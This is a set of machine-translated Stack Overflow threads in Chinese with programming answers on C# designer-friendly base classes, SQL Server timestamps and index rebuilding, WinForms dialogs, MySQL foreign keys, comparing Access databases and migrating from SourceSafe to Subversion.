我有一个带有一些抽象方法的类，但我希望能够在设计器中编辑该类的子类。但是，设计者不能编辑子类，除非它可以创建父类的实例。所以我的计划是用存根替换抽象方法并将它们标记为虚拟 - 但是如果我创建另一个子类，如果我忘记实现它们，我将不会收到编译时错误。

有没有办法标记方法，以便它们必须由子类实现，而不将它们标记为抽象？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-10-27T09:32:54.553

好吧，你可以做一些非常混乱的代码`#if`——即`DEBUG`它是虚拟的（对于设计师来说），但`RELEASE`它是抽象的。不过，要维持真的很痛苦。

但除此之外：基本上，没有。如果你想要设计师支持，它不能是抽象的，所以你只剩下“虚拟”（大概是基础方法抛出 a `NotImplementedException`）。

当然，您的单元测试会检查方法是否已实现，是吗？;-p

实际上，通过泛型进行测试可能很容易 - 即具有以下形式的通用测试方法：

```
[Test]
public void TestFoo() {
  ActualTest<Foo>();
}
[Test]
public void TestBar() {
  ActualTest<Bar>();
}

static void ActualTest<T>() where T : SomeBaseClass, new() {
  T obj = new T();
  Assert.blah something involving obj
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-10-27T16:01:34.580

您可以在课堂上使用对实现习语的引用。

```
public class DesignerHappy
{
    private ADesignerHappyImp imp_;

    public int MyMethod()
    {
        return imp_.MyMethod()    
    }

    public int MyProperty
    {
        get { return imp_.MyProperty; }
        set { imp_.MyProperty = value; }
    }
}

public abstract class ADesignerHappyImp
{
    public abstract int MyMethod();
    public int MyProperty {get; set;}
} 
```

DesignerHappy 只是公开您想要的接口，但将所有调用转发到实现对象。您通过继承 ADesignerHappyImp 来扩展行为，这会强制您实现所有抽象成员。

您可以提供 ADesignerHappyImp 的默认实现，该实现默认用于初始化 DesignerHappy 并公开一个允许您更改实现的属性。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-11-20T16:36:21.430

请注意，构造函数中未设置“DesignMode”。它是在 VS 解析 InitializeComponents() 方法之后设置的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-27T10:15:16.353

我知道它并不完全是你所追求的，但你可以让基类中的所有存根都抛出 NotImplementedException。然后，如果您的任何子类没有覆盖它们，那么当基类中的方法被调用时，您将获得运行时异常。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-27T15:20:32.650

Component 类包含一个名为“DesignMode”的布尔属性，当您希望代码在设计器中的行为与运行时不同时，该属性非常方便。在这种情况下可能会有一些用处。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-27T17:11:04.893

作为一般规则，如果一种语言无法做某事，这通常意味着有一个很好的概念理由不去做。

有时这将是语言设计者的错——但并不常见。通常我发现他们比我更了解语言设计；-)

在这种情况下，您需要一个未覆盖的虚拟方法来引发编译时异常（而不是运行时异常）。基本上是一个抽象方法。

让虚拟方法表现得像抽象方法只会为你进一步创造一个混乱的世界。

另一方面，VS 插件设计通常并不完全处于同一水平（这有点不公平，但肯定比在语言设计阶段应用的严格性要低——这是正确的）。一些 VS 工具，如类设计器和当前的 WPF 编辑器，是不错的想法，但还不是很完整。

在您所描述的情况下，我认为您有一个不使用类设计器的论点，而不是破解您的代码的论点。

在某个时候（可能在下一个 VS 中），他们会整理类设计器如何处理抽象类，然后你就会有一个不知道为什么要这样编码的 hack。

它应该始终是破解代码以适应设计者的最后手段，并且当您尝试将破解保持在最低限度时。我发现拥有简洁易读的代码通常比在当前损坏的工具中工作的拜占庭代码更有意义。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2011-10-19T02:26:29.743

以 ms 为例...

Microsoft 使用 silverlight 中的用户控件模板执行此操作。#if 是完全可以接受的，而且工具是否会很快解决它是值得怀疑的。恕我直言

# php - PHP：将当前时间戳插入 SQL Server 2005

> ID：239414
> 
> 赞同：8
> 
> 时间：2008-10-27T09:31:15.977
> 
> 标签：php, sql-server

如何将 current_timestamp 插入带有时间戳列的 SQL Server 2005 数据库数据中？

它应该很简单，但我无法让它工作。例子将不胜感激。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-10-27T09:33:21.307

如果您可以从 PHP 执行查询，那么它应该只是使用 'getdate()' 的问题；

```
update MyTable set MyColumn=getdate(); 
```

或者

```
insert into MyTable (MyColumn) values (getdate()); 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-10-27T09:40:37.423

列数据类型应为日期时间

您可以让数据库计算出日期：

```
$sql = 'INSERT INTO tablename (fieldname) VALUES (getdate())'; 
```

或让 PHP 计算出日期

```
$sql = 'INSERT INTO tablename (fieldname) VALUES (\'' . date('Y-m-d H:i:s') . '\')'; 
```

然后类似`mssql_execute($sql);`，但这取决于您如何连接到数据库

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2011-11-23T01:08:12.230

要将数据插入时间戳字段，我认为您必须使用`DEFAULT`. 例如：

```
INSERT INTO User(username, EnterTS) VALUES ('user123', DEFAULT) 
```

`EnterTS`时间戳字段在哪里

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-27T09:34:22.240

您只需使用正常机制在 SQL Server 中执行查询，然后使用以下内容。

current_timestamp 函数返回它

```
 insert into table (creation_date) VALUES (current_timestamp) 
```

完整示例

```
CREATE table timestamp_test (creation_timestamp datetime)
INSERT INTO timestamp_test (creation_timestamp) VALUES (current_timestamp)
SELECT * FROM timestamp_test
DROP TABLE timestamp_test 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-27T15:00:33.767

如果您解释您收到的错误（并发布您的插入或更新代码），它可能更容易看出您的问题是什么。一个可能的问题是您必须插入日期时间字段（或者在 2008 年您也可以使用日期字段）。有时人们认为他们可以将当前日期插入时间戳字段，但即使这种数据类型的名称似乎应该与日期相关，但这种数据类型实际上与日期和时间无关，并且不能接受日期数据。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-06-14T16:14:23.390

我意识到这是一个旧帖子，但我遇到了这个并认为其他人也可能。

我所做的是使用 datetime 的数据类型在表中创建一个字段，然后对于默认值或绑定的列属性，我输入`getdate()`. 现在，输入到表中的每条记录都有一个日期和时间戳。

# java - Java Swing 中的事件是如何工作的？

> ID：239424
> 
> 赞同：6
> 
> 时间：2008-10-27T09:32:56.720
> 
> 标签：java, swing, events

Java Swing 中的事件创建和处理是如何工作的？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-10-27T09:42:00.570

java事件机制实际上是观察者设计模式的一种实现。我建议你稍微阅读一下观察者模式，这会让你对 Java 中的事件机制是如何工作的有很多了解。

[参见维基百科上的观察者模式](http://en.wikipedia.org/wiki/Observer_pattern)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-10-27T09:44:44.123

通常，事件是通过向将引发事件的类注册回调函数来处理的。当事件发生时，该类将调用回调函数。

你会从 swing 中找到很多例子。这是我一段时间前制作的聊天应用程序的非摆动示例

这是一个库，可以让开发人员将聊天功能嵌入到他们的应用程序中。ChatClient 类有一个 IMessageListener 类型的成员

```
IMessageListener listener; 
```

在为 ChatClient 类创建对象之后，用户将对对象调用 setListener。（可以是多个监听器的 addListerer）

```
public void setListener(IMessageListener listener) {
    this.listener = listener;
} 
```

在收到消息时的库方法中，我会在该侦听器对象上调用 getMessage 方法

这是一个基本的例子。更复杂的库会使用更复杂的方法，比如实现事件队列、线程、并发等。

编辑：是的。这确实是观察者模式

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-27T09:37:51.577

这里有一个关于事件处理的教程：http: [//java.sun.com/docs/books/tutorial/uiswing/events/index.html](http://java.sun.com/docs/books/tutorial/uiswing/events/index.html)

这是关于摇摆的。如果这不起作用，也许你可以更具体一点？

# sql-server - 独立应用程序：随着时间的推移保持数据库健康/响应

> ID：239425
> 
> 赞同：0
> 
> 时间：2008-10-27T09:33:19.997
> 
> 标签：sql-server, winforms

我有一个使用 MS SQL Server Express 数据库的 WinForms C# 应用程序。该应用程序部署在我们客户的 PC 上，他们没有计算机相关知识。

应用程序会定期更新数据库，我看到索引文件上有很多碎片。如何随着时间的推移保持数据库的健康/响应？

我正在考虑编写一个重新组织每个索引的存储过程，但我缺乏 t-sql 技能；有人可以引导我走向正确的方向吗？

巴斯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-27T10:08:02.343

如果您可以让表脱机一段时间，请使用 DBCC REINDEX 选项，或者 DBCC INDEXDEFRAG。虽然 IndexDefrag 选项已被弃用。您还可以在 SQL 2005/2008 中使用 ALTER INDEX 语句。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-27T12:50:27.180

如果能编写一个可重用的存储过程，它可以使用最佳 DBA 维护实践以编程方式在数据库上完成我应该做的所有事情，那就太好了。

像更新统计信息，检查页面错误，碎片整理，重新索引，缩小？......

就像一个“让我的数据库健康”的存储过程

谁有这样的脚本可用？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-27T11:42:01.093

还要确保您的数据库文件不太容易出现碎片。这确实很难做到，因为您不知道客户驱动器的布局是什么，但我建议以相当大的初始大小启动您的 .MDB 文件，以防止在线重建，这会浪费时间和资源，并且经常导致文件级碎片。

您的索引设计也会影响索引的碎片化程度。您需要确保要插入的索引具有适当低的[FILLFACTOR](http://msdn.microsoft.com/en-us/library/aa933139(SQL.80).aspx)以防止页面拆分。还要摆脱任何未使用的索引。

要对索引进行碎片整理，请使用[DBCC DBREINDEX](http://msdn.microsoft.com/en-us/library/ms181671.aspx)命令。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-12-11T16:12:05.173

我现在使用 2 个 sql 脚本。

```
SELECT 
    st.object_id AS objectid,
    st.index_id AS indexid,
    partition_number AS partitionnum,
    avg_fragmentation_in_percent AS frag,
    o.name,
    i.name
FROM 
    sys.dm_db_index_physical_stats (DB_ID(), NULL, NULL , NULL, 'LIMITED') st
join
    sys.objects o on o.object_id = st.object_id
join 
    sys.indexes i on st.object_id = i.object_id and i.index_id=st.index_id 
```

我在启动程序时运行它并检查我的主表的 avg_fragmentation_in_percent 是否超过 70。如果是，我运行以下脚本。

```
SET NOCOUNT ON;
DECLARE @objectid int;
DECLARE @indexid int;
DECLARE @partitioncount bigint;
DECLARE @schemaname nvarchar(130); 
DECLARE @objectname nvarchar(130); 
DECLARE @indexname nvarchar(130); 
DECLARE @partitionnum bigint;
DECLARE @partitions bigint;
DECLARE @frag float;
DECLARE @command nvarchar(4000); 
-- Conditionally select tables and indexes from the sys.dm_db_index_physical_stats function 
-- and convert object and index IDs to names.

if ( object_id( 'tempdb..#work_to_do' ) is not null )
  DROP TABLE #work_to_do;

-- Alleen indexen die meer dan x% gefragemteerd zijn
SELECT
    object_id AS objectid,
    index_id AS indexid,
    partition_number AS partitionnum,
    avg_fragmentation_in_percent AS frag
INTO #work_to_do
FROM sys.dm_db_index_physical_stats (DB_ID(), NULL, NULL , NULL, 'LIMITED')
WHERE avg_fragmentation_in_percent > 5.0 AND index_id > 0;

-- Declare the cursor for the list of partitions to be processed.
DECLARE partitions CURSOR FOR SELECT * FROM #work_to_do;

-- Open the cursor.
OPEN partitions;

-- Loop through the partitions.
WHILE (1=1)
    BEGIN;
        FETCH NEXT
           FROM partitions
           INTO @objectid, @indexid, @partitionnum, @frag;
        IF @@FETCH_STATUS < 0 BREAK;
        SELECT @objectname = QUOTENAME(o.name), @schemaname = QUOTENAME(s.name)
        FROM sys.objects AS o
        JOIN sys.schemas as s ON s.schema_id = o.schema_id
        WHERE o.object_id = @objectid;
        SELECT @indexname = QUOTENAME(name)
        FROM sys.indexes
        WHERE  object_id = @objectid AND index_id = @indexid;
        SELECT @partitioncount = count (*)
        FROM sys.partitions
        WHERE object_id = @objectid AND index_id = @indexid;

        SET @command = N'ALTER INDEX ' + @indexname + N' ON ' + @schemaname + N'.' + @objectname + N' REBUILD WITH (FILLFACTOR = 90)';
        IF @partitioncount > 1
            SET @command = @command + N' PARTITION=' + CAST(@partitionnum AS nvarchar(10));
        EXEC (@command);
        PRINT N'Executed: ' + @command;
    END;

-- Close and deallocate the cursor.
CLOSE partitions;
DEALLOCATE partitions;

-- Drop the temporary table.
DROP TABLE #work_to_do; 
```

此脚本对碎片率超过 5% 的所有表进行碎片整理

# winforms - 返回对象而不是 DialogResult 的 Windows 窗体模态对话框

> ID：239435
> 
> 赞同：5
> 
> 时间：2008-10-27T09:41:38.280
> 
> 标签：winforms, forms, modal-dialog

我有点坚持这个，所以我希望有人能帮助我。

我正在做一个 Winforms 应用程序，我需要显示一个返回值的模态对话框 (form.ShowDialog)（提示用户一些值并将它们包装在一个对象中）。

我只是看不到如何做到这一点，而不是引用对象或依赖某种形式的公共属性来读取数据。

我只想让 ShowDialog 返回一些不同的东西，但这不起作用。有一些“好”的方法来做到这一点吗？

我确信这个问题并不新鲜，但由于似乎几乎没有人再使用 Winforms，所以我在网上找不到任何指导。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2008-10-27T09:49:14.753

在表单中添加一个静态方法，如下所示：

```
public class MyDialog : Form
{
    // todo: think of a better method name :)
    public static MyObject ShowAndReturnObject() 
    {
        var dlg = new MyDialog();
        if (new dlg.ShowDialog() == DialogResult.OK) 
        {
            var obj = // construct an instance of MyObject from dlg
            return obj;
        }
        else
        {
           return null; 
        }
    }
} 
```

现在您可以从您的程序中调用它：

```
var myObject = MyDialog.ShowAndReturnObject(); 
```

...如果他们取消对话框，myObject 将为空。

现在，说了这么多，我确实相信在表单的类中添加一个属性，然后在调用 ShowDialog() 之后读取该属性是更好的方法。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-06T23:18:59.880

您可以在 Dialog 内创建一个表示返回值的公共属性：

```
/* Caller Code */   
var dlg = new MyDialog();
if(dlg.ShowDialog() == DialogResult.OK)
  MessageBox.Show(dlg.MyResult);

/* Dialog Code */
public string MyResult { get { return textBox1.Text; } }

private void btnOk_Click(object sender, EventArgs e)
{
  DialogResult = System.Windows.Forms.DialogResult.OK;
  this.Close();
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-27T09:55:37.797

或者，您可以在表单类中创建一个新的 ShowDialog 方法，该方法基本上完成了 Matt Hamilton 的工作。如果您对问题中的许多表单执行此操作，甚至可能是一种扩展方法。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-06-24T18:57:52.070

对话框表单中的公共属性是有意义的。但是，不要在 Ok 按钮单击事件处理程序中关闭对话框。当您分配 DialogResult 属性时，对话框表单将被隐藏。然后在调用表单中，您可以通过检查 DialogResult 来确定是否单击了 Ok 或 Cancel。然后，如果单击 Ok 按钮，您可以访问公共属性，然后处理对话框表单。这应该使用调用表单中的 try-catch-finally 块或通过 using 语句来完成。您必须处理模态对话框以防止内存泄漏。

# vb.net - VB.NET 最好的模拟框架是什么？

> ID：239439
> 
> 赞同：7
> 
> 时间：2008-10-27T09:43:13.393
> 
> 标签：vb.net, frameworks, mocking

在语法方面和能力方面最好的模拟框架是什么？

我的问题：现在大多数模拟框架都使用 lambda 表达式，这在 VB.NET 中编写起来真的很难看，那么有没有框架在没有 lambda 的情况下具有良好的语法或具有不需要 lambda 的流畅语法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-27T10:21:08.200

我认为功能明智的 Typemock 是 .Net 的最佳框架，它不是在运行时工作，而是挂钩到 CLR 并可以拦截任何调用。这使您能够模拟和测试任何您想要的东西。有些人认为它太强大了。它允许您测试任何东西，而通常您无法测试某些东西的事实是一个很好的警告，表明您的设计存在问题。而且它不是免费的。

我主要使用 Rhino Mocks。它具有非常易读的语法，尤其是新的 AAA 语法。起订量很新，语法上也应该不错。虽然我还没有测试过。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-27T10:16:40.953

犀牛嘲笑。

但是你可能会遇到新的 lambda 表达式语法的问题（尤其是在设置 subs 的期望时），所以要么使用新的语法，要么准备好解决它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-24T09:23:41.580

[Typemock 的](http://www.typemock.com/index.php)VB API 使用起来非常简单，并且它具有各种功能，例如伪造共享函数。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-05-20T23:34:41.337

仅供参考，Isolator 具有 VB.NET 特定的 API，因此您应该能够轻松使用它： [http ://www.typemock.com/vbpage.php](http://www.typemock.com/vbpage.php)

但是，它是一种商业产品。

# mysql - 创建新表时如何添加外键？

> ID：239443
> 
> 赞同：16
> 
> 时间：2008-10-27T09:44:32.517
> 
> 标签：mysql, create-table

我有这两个`CREATE TABLE`陈述：

```
CREATE TABLE GUEST (
  id int(15) not null auto_increment PRIMARY KEY,
  GuestName char(25) not null
);

CREATE TABLE PAYMENT (
  id int(15) not null auto_increment
  Foreign Key(id) references GUEST(id),
  BillNr int(15) not null
); 
```

第二个陈述有什么问题？它没有创建新表。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2008-10-27T11:42:34.120

你的问题的答案与[这个](https://stackoverflow.com/questions/236668/foreign-keys-in-mysql#236677)问题的答案几乎相同。

您需要在包含外键的表中指定包含主键的表的名称，以及主键字段的名称（使用“引用”）。

[这](http://dev.mysql.com/doc/refman/5.0/en/innodb-foreign-key-constraints.html)有一些代码显示了如何自己创建外键，以及在 CREATE TABLE 中。

这是其中一个更简单的示例：

```
CREATE TABLE parent (id INT NOT NULL,
   PRIMARY KEY (id)
) ENGINE=INNODB;
CREATE TABLE child (id INT, parent_id INT,
   INDEX par_ind (parent_id),
   FOREIGN KEY (parent_id) REFERENCES parent(id)
   ON DELETE CASCADE
) ENGINE=INNODB; 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-10-27T11:35:23.277

我建议为付款表设置一个唯一键。另一方面，外键不应该是 auto_increment 因为它引用了一个已经存在的键。

```
CREATE TABLE GUEST(
    id int(15) not null auto_increment PRIMARY KEY, 
    GuestName char(25) not null
)  ENGINE=INNODB;

CREATE TABLE PAYMENT(
    id int(15)not null auto_increment, 
    Guest_id int(15) not null, 
    INDEX G_id (Guest_id), 
    Foreign Key(Guest_id) references GUEST(id),
    BillNr int(15) not null
)  ENGINE=INNODB; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-27T11:12:58.343

确保您将 InnoDB 引擎用于数据库或两个表。来自 MySQL 参考：

> 对于 InnoDB 以外的存储引擎，MySQL Server 解析 CREATE TABLE 语句中的 FOREIGN KEY 语法，但不使用或存储它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-04-26T13:16:27.750

```
create table course(ccode int(2) primary key,course varchar(10));

create table student1(rollno int(5) primary key,name varchar(10),coursecode int(2) not 
null,mark1 int(3),mark2 int(3),foreign key(coursecode) references course(ccode)); 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2011-03-19T05:06:22.010

`int(15)`和之间应该有空格`not null`

# ms-access - 我可以比较两个 ms-access 文件吗？

> ID：239450
> 
> 赞同：9
> 
> 时间：2008-10-27T09:49:26.873
> 
> 标签：ms-access, ms-office

我想比较两个 ms-access .mdb 文件以检查它们包含的数据是否相同。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-27T21:17:31.963

我已经在代码中多次做过这种事情，主要是在本地 MDB 需要从网站上输入的数据中应用更新的情况下。在一种情况下，该网站由 MDB 驱动，在另一种情况下，它是 MySQL 数据库。对于 MDB，我们刚刚下载了它，对于 MySQL，我们在网站上运行脚本来导出和 FTP 文本文件。

现在，重点是我们想将本地 MDB 中的数据与从网站下载的数据进行比较，并更新本地 MDB 以反映网站上所做的更改（不，不可能使用单个数据源 - - 这是我建议的第一件事，但这是不可行的）。

让我们将 MDB A 称为您的本地数据库，并将 MDB B 称为您正在下载以进行比较的数据库。您需要检查的是：

1.  存在于 MDB A 但不存在于 MDB B 中的记录。这些可能会或可能不会被删除（这取决于您的特定数据）。

2.  MDB B 中存在但 MDB A 中不存在的记录。这些记录将从 MDB B 附加到 MDB A。

3.  两者中都存在的记录，需要逐个字段进行比较。

步骤#1 和#2 很容易通过使用外连接查找丢失记录的查询来完成。第 3 步需要一些代码。

代码背后的原理是两个 MDB 中所有表的结构都是相同的。因此，您使用 DAO 遍历 TableDefs 集合，打开记录集，然后遍历 fields 集合以在每个表的每一列上运行 SQL 语句，以更新数据或输出差异列表。

代码背后的基本结构是：

```
 Set rs = db.OpenRecordset("[SQL statement with the fields you want compared]")
  For Each fld In rs.Fields
    ' Write a SQL string to update all the records in this column
    '   where the data doesn't match
    strSQL = "[constructed SQL here]"
    db.Execute strSQL, dbFailOnError
  Next fld 
```

现在，这里的主要复杂性是每个字段的 WHERE 子句必须不同——文本字段需要与数字和数据字段区别对待。因此，您可能需要一个 SELECT CASE 来根据字段类型编写 WHERE 子句：

```
 Select Case fld.Type
    Case dbText, dbMemo
    Case Else
  End Select 
```

您将希望使用 Nz() 来比较文本字段，但您将使用 Nz(TextField,'') 来比较文本字段，而将 Nz(NumericField,0) 用于数字字段或日期字段。

我的示例代码实际上并没有使用上面的结构来定义 WHERE 子句，因为它仅限于与 ZLS（文本字段）连接时效果很好的字段。下面的内容读起来相当复杂，但它基本上是对上述结构的扩展。

它是为了更新效率而编写的，因为它对表的每个字段执行 SQL UPDATE，这比对每一行执行 SQL UPDATE 效率高得多。另一方面，如果您不想进行更新，但想要一份差异列表，您可能会以不同的方式对待整个事情。但这会变得相当复杂，具体取决于输出，

如果您只想知道两个 MDB 是否相同，则首先检查每个表中的记录数，如果有一个不匹配，则退出并告诉用户 MDB 不相同。如果记录数相同，那么您必须逐个字段检查，我认为最好使用动态编写的逐列 SQL 来完成——只要结果 SQL SELECTS 之一返回 1 个或多个记录，您就中止并告诉您的用户 MDB 不相同。

复杂的部分是，如果您想记录差异并通知用户，但是这样做会使这个已经无休止的帖子变得更长！

下面是一个更大的子例程的一部分代码，它使用来自 qdfNewMembers（来自 MDB B）的数据更新保存的查询 qdfOldMembers（来自 MDB A）。第一个参数 strSQL 是一个 SELECT 语句，仅限于您要比较的字段，而 strTmpDB 是另一个 MDB（在我们的示例中为 MDB B）的路径/文件名。该代码假定 strTmpDB 已经创建了 qdfNewMembers 和 qdfOldMembers（原始代码即时写入保存的 QueryDef）。它也可以是直接表名（我使用保存查询的唯一原因是字段名在为其编写的两个 MDB 之间不完全匹配）。

```
Public Sub ImportMembers(strSQL As String, strTmpDB As String)
  Const STR_QUOTE = """"
  Dim db As Database
  Dim rsSource As Recordset '
  Dim fld As Field
  Dim strUpdateField As String
  Dim strZLS As String
  Dim strSet As String
  Dim strWhere As String

  ' EXTENSIVE CODE LEFT OUT HERE

  Set db = Application.DBEngine(0).OpenDatabase(strTmpDB)

  ' UPDATE EXISTING RECORDS
  Set rsSource = db.OpenRecordset(strSQL)
  strSQL = "UPDATE qdfNewMembers INNER JOIN qdfOldMembers ON "
  strSQL = strSQL & "qdfNewMembers.EntityID = qdfOldMembers.EntityID IN '" _
                       & strTmpDB & "'"
  If rsSource.RecordCount <> 0 Then
     For Each fld In rsSource.Fields
       strUpdateField = fld.Name
       'Debug.Print strUpdateField
       If InStr(strUpdateField, "ID") = 0 Then
          If fld.Type = dbText Then
             strZLS = " & ''"
          Else
             strZLS = vbNullString
          End If
          strSet = " SET qdfOldMembers." & strUpdateField _
                     & " = varZLStoNull(qdfNewMembers." & strUpdateField & ")"
          strWhere = " WHERE " & "qdfOldMembers." & strUpdateField & strZLS _
                       & "<>" & "qdfNewMembers." & strUpdateField & strZLS _
                       & " OR (IsNull(qdfOldMembers." & strUpdateField _
                       & ")<>IsNull(varZLStoNull(qdfNewMembers." _
                       & strUpdateField & ")));"
          db.Execute strSQL & strSet & strWhere, dbFailOnError
          'Debug.Print strSQL & strSet & strWhere
       End If
     Next fld
  End If
End Sub 
```

函数 varZLSToNull() 的代码：

```
Public Function varZLStoNull(varInput As Variant) As Variant
  If Len(varInput) = 0 Then
     varZLStoNull = Null
  Else
     varZLStoNull = varInput
  End If
End Function 
```

我不知道这是否太复杂以至于没有意义，但也许它会对某人有所帮助。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2011-09-05T19:15:42.003

您可以尝试[AccessDiff](http://www.kellermansoftware.com/p-33-accessdiff.aspx)（付费产品）。它具有比较模式、数据以及访问对象的能力。它有一个 GUI 和一个命令行界面。

披露：我是这个工具的创造者。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-27T10:37:36.497

获取数据库表的文本转储，并使用 BeyondCompare（或任何其他文本比较工具）简单地比较转储的文本文件。粗制滥造，但可以工作！

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-27T10:45:02.800

[我对Cross-Database Comparator](http://www.dbbalance.com/)有很好的经验。它能够比较结构和/或数据。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-11-30T21:39:49.387

[请参阅我网站上Microsoft Access 第三方实用程序、产品、工具、模块等](http://www.granite.ab.ca/access/thirdparty.htm)页面上的比较 Access 数据库部分。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-03-04T20:41:44.733

不久前，我在我的[accdbmerge](https://www.db-merge-tools.net/microsoft-access-diff-merge-overview.html)实用程序中添加了“table diff”功能。我相信这个答案无助于解决原始问题，但它可能对将来面临同样问题的人有所帮助。

* * *

## 回答 #7

> 赞同：-4
> 
> 时间：2008-10-27T10:12:13.100

如果您想知道文件是否相同，那么

```
fc file1.mdb file2.mdb 
```

在 DOS 命令行上。

如果文件不相同，但您怀疑它们包含相同的表和记录，那么最简单的方法是快速编写一个小实用程序，打开两个数据库并循环遍历执行异构查询的表以提取两者之间的差异文件。

有一些工具可以为您执行此操作，但它们似乎都是共享软件。

# svn - Subversion 与 SourceSafe 中的性能

> ID：239452
> 
> 赞同：5
> 
> 时间：2008-10-27T09:50:06.157
> 
> 标签：svn, version-control, visual-sourcesafe

我们是一个由 5 名开发人员组成的分布式团队，致力于相当大的集成项目。我们目前使用 SourceSafe（是的，我*知道*它很糟糕，但它直到最近才起作用，而且我们一直在使用它）。我们最近最大的问题是性能。签入和签出项目只需要很长时间，我们发现自己花了很多时间等待 SourceSafe（是的，我们已经关闭了防病毒检查和所有其他性能提升 trix - 它仍然很慢）。

我们现在正在考虑设置并将我们所有的东西转移到 Subversion。*与 Subversion 相比，Web 上的 SourceSafe 的性能如何？*我猜想移动历史并不是那么重要（如果我们需要一个旧文件，我们可以返回到 VSS 数据库）并且将文件实际移动到 Subversion 应该是一个问题 - 对吧？

除了实际的 Subversion 核心工具之外，我还想对“必须拥有”的工具和附加组件进行一些输入。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2008-10-27T10:35:34.613

VSS的**签入**在 SVN中称为**提交。**此操作要快很多倍，因为 SVN 只会传输您对文件所做的更改（也称为“差异”），而 VSS 将发送整个文件并在服务器上对其进行区分。

如果您使用的是 http(s) 并且文件的总大小很大 (>100MB)，则 SVN中的**签出**（获取初始工作副本）与其他系统相比有些慢。SVN 最坏的情况是很多文件和目录，因为 HTTP 传输将比大的单个文件慢得多。

但是，我怀疑 VSS 会比 SVN 快。SVN 的整体性能比 VSS 更快、更健壮（无数据库损坏）且更易于理解。

不错的工具是 TortoiseSVN（Explorer 插件）、smartSVn（VSS-lookalike）和命令行（灵活），因为 Tigraine 在我的评论中添加：AnkhSVN（Visual Studio 集成）和 Eclipse IDE 的颠覆性/subclipse

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2008-10-27T10:32:37.647

*您可能还会发现[这个问题](https://stackoverflow.com/questions/115493/how-do-i-convince-my-team-to-drop-sourcesafe-and-move-to-svn)很相关。*

## 表现

SVN 和 VSS 中单个操作需要多长时间的主要区别在于 SVN 原则：操作时间应与更改的大小成正比，而不是与项目的大小成正比。这在获取最新版本 (VSS) 与更新 (SVN) 中最为明显。VSS“获取最新版本”总是遍历项目中的所有文件，检查它们的状态。这需要很长时间。与此相比，SVN 会检查项目历史记录并仅操作被触及的文件。在典型的场景中，这是一个巨大的胜利，因为通常只触及几个文件。即使触摸文件，在 SVN 中传输更改也比在 VSS 中快得多，因为与 VSS 中的整个文件相比，仅传输更改。Commits (Checkin) 也是如此，SVN 在对大文件进行小的更改时速度要快得多。

## 最重要的工具

对于 Visual Studio 开发人员来说，最重要的工具是：

*   [TortoiseSVN](http://tortoisesvn.tigris.org/) - 通过 Windows Shell 访问存储库
*   [AnkhSVN](http://ankhsvn.open.collab.net/) - Visual Studio 集成
*   有些人还推荐[VisualSVN](http://www.visualsvn.com/)作为 VS 集成，但我认为使用 AnkhSVN 2 集成已经足够好

我什至说拥有 TortoiseSVN 和 AnkhSVN 你根本不需要安装“Subversion 核心工具”。核心命令行工具非常有用，例如自动化，但对于一般的日常工作，我从不使用它们，并且 TortoiseSVN 或 AnkhSVN 工作不需要安装它们。

## 网络访问

SVN 原生支持通过 Web 访问，并且支持得非常好。对于 VSS，您需要外部应用程序，虽然它们还不错，但它们与原始环境不是 1:1，而且它们的速度仍然有些不足。

## 如何转换

VSS2SVN是一种工具，它可以相当快且相当好地执行转换[。](http://www.pumacode.org/projects/vss2svn)根据我们的经验，我强烈建议不要使用“稳定”构建，而是使用每日快照 - 它能够处理历史记录中的许多项目，从而使之前的构建完全失败。

我们已经成功地使用了最近的每日构建和一个历史悠久的庞大数据库，结果非常好。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-10-27T09:57:09.760

使用 Subversion 远程访问要容易得多。

如果您不关心保留历史记录，那么从 VSS 迁移到 subversion 也很容易。您只需手动删除源代码控制绑定（*.scc 文件）。

至于工具，您可能想要获取 TortoiseSVN，也许还需要一个用于 Visual Studio（如果您正在使用的话）的插件，例如 Ankh SVN（免费）。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-27T10:00:05.760

如果您确实关心保留历史记录，那么[http://www.pumacode.org/projects/vss2svn](http://www.pumacode.org/projects/vss2svn)将从一个存储库转换到另一个存储库。

